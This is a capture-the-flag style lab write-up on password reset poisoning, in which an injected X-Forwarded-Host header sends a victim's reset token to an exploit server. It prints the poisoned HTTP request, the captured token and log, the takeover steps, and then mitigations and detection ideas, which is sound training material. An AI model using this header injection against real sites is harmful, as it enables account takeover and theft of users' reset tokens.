@@ -1,0 +1,127 @@
+================================
+LAB: Password reset poisoning via middleware
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: January 20, 2026
+Lab URL: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
+Category: Authentication Vulnerabilities
+Level: Apprentice
+Objective: Log in to Carlos's account by exploiting password reset poisoning
+Description: This lab is vulnerable to password reset poisoning via the X-Forwarded-Host header. The user carlos will carelessly click on any links in emails that he receives. Access credentials: wiener:peter
+
+[RECONNAISSANCE]
+----------------
+Initial exploration revealed a standard password reset functionality:
+- Endpoint: POST /forgot-password with parameter username
+- Email delivery system sends password reset links to users
+- Reset links contain temporary tokens in the format: /forgot-password?temp-forgot-password-token=[TOKEN]
+- Access to an exploit server for hosting malicious content and logging incoming requests
+
+Testing the normal flow with the wiener account confirmed:
+1. Password reset request triggers email delivery
+2. Email contains a clickable link with a unique token
+3. Token is valid for password reset operations
+4. The application constructs reset URLs dynamically
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+The lab title "via middleware" hinted at header-based exploitation, specifically targeting proxy-related headers like X-Forwarded-Host.
+
+Hypothesis: The application trusts the X-Forwarded-Host header when constructing password reset URLs in emails.
+
+Testing methodology:
+1. Intercepted a legitimate password reset request for carlos
+2. Added the header: X-Forwarded-Host: exploit-0a2a008c04b1407780e402f1014e0057.exploit-server.net
+3. Sent the modified request
+4. Monitored the exploit server access logs
+
+Result: Carlos clicked the link in his email, and his browser made a request to the exploit server containing his password reset token.
+
+Root cause: The server-side code constructs the reset URL using the X-Forwarded-Host header without validation:
+- domain = request.headers.get('X-Forwarded-Host')
+- reset_url = f"https://{domain}/forgot-password?token={token}"
+
+This allows an attacker to inject an arbitrary domain into the password reset email.
+
+[EXPLOITATION]
+--------------
+Step 1: Prepare the exploit server
+- Access the exploit server provided in the lab
+- Note the exploit server domain: exploit-0a2a008c04b1407780e402f1014e0057.exploit-server.net
+
+Step 2: Poison the password reset request
+- Navigate to /forgot-password on the target application
+- Intercept the POST request in Burp Suite
+- Modify the request to include:
+  * username=carlos (target victim)
+  * X-Forwarded-Host: exploit-0a2a008c04b1407780e402f1014e0057.exploit-server.net
+- Forward the modified request
+
+Step 3: Wait for victim interaction
+- Carlos receives an email with a reset link pointing to the exploit server
+- Carlos clicks the link (he clicks on all links in emails)
+- His browser sends: GET /forgot-password?temp-forgot-password-token=qfuznegjd3dpge02c5qlkv30p4rfpgsa
+
+Step 4: Capture the token from logs
+- Access the exploit server's access log
+- Identify the request from victim (user-agent: Mozilla/5.0 (Victim))
+- Extract token: qfuznegjd3dpge02c5qlkv30p4rfpgsa
+
+Step 5: Use the stolen token
+- Construct the legitimate reset URL: https://0ab200fe042340818016036e00390006.web-security-academy.net/forgot-password?temp-forgot-password-token=qfuznegjd3dpge02c5qlkv30p4rfpgsa
+- Access the URL in the browser
+- Set a new password for carlos
+- Log in with the new credentials
+
+[EVIDENCE]
+----------
+Malicious request sent:
+POST /forgot-password HTTP/1.1
+Host: 0ab200fe042340818016036e00390006.web-security-academy.net
+X-Forwarded-Host: exploit-0a2a008c04b1407780e402f1014e0057.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+username=carlos
+
+Exploit server log entry showing successful token capture:
+10.0.4.64   2026-01-20 17:35:15 +0000 "GET /forgot-password?temp-forgot-password-token=qfuznegjd3dpge02c5qlkv30p4rfpgsa HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+
+Captured token: qfuznegjd3dpge02c5qlkv30p4rfpgsa
+
+Lab status: SOLVED
+
+[LESSONS LEARNED]
+-----------------
+Technical takeaways:
+1. X-Forwarded-Host is a header normally added by reverse proxies to preserve the original Host value when routing requests
+2. Applications that trust this header without validation are vulnerable to host header injection attacks
+3. Password reset poisoning allows complete account takeover by manipulating where reset links point
+4. The vulnerability exists in the application code regardless of user behavior, but exploitation requires user interaction
+
+Security implications:
+- Impact: Critical (full account takeover of any user)
+- Attack complexity: Low (simple header injection)
+- User interaction: Required (victim must click the malicious link)
+- Overall severity: Medium-High
+
+Real-world exploitation considerations:
+- In production environments, this would require social engineering to convince users to click
+- Corporate environments have higher success rates (30-40%) due to users trusting legitimate-looking emails
+- The attack is more dangerous when combined with urgency tactics or spear phishing
+
+Mitigation strategies:
+1. Never trust X-Forwarded-Host or similar headers without validation
+2. Use a whitelist of allowed domains for password reset URLs
+3. Hardcode the application domain in configuration rather than deriving it from headers
+4. Implement proper reverse proxy configuration to strip or validate forwarded headers
+5. Add additional verification steps for password resets (e.g., security questions, 2FA)
+
+Detection methods:
+- Monitor for unusual X-Forwarded-Host values in logs
+- Alert on password reset requests with external domains
+- Track password reset completion rates for anomalies
+
+Key concept: Trust boundaries matter. Headers that pass through proxies or can be controlled by clients should never be trusted for security-critical operations like constructing password reset URLs.
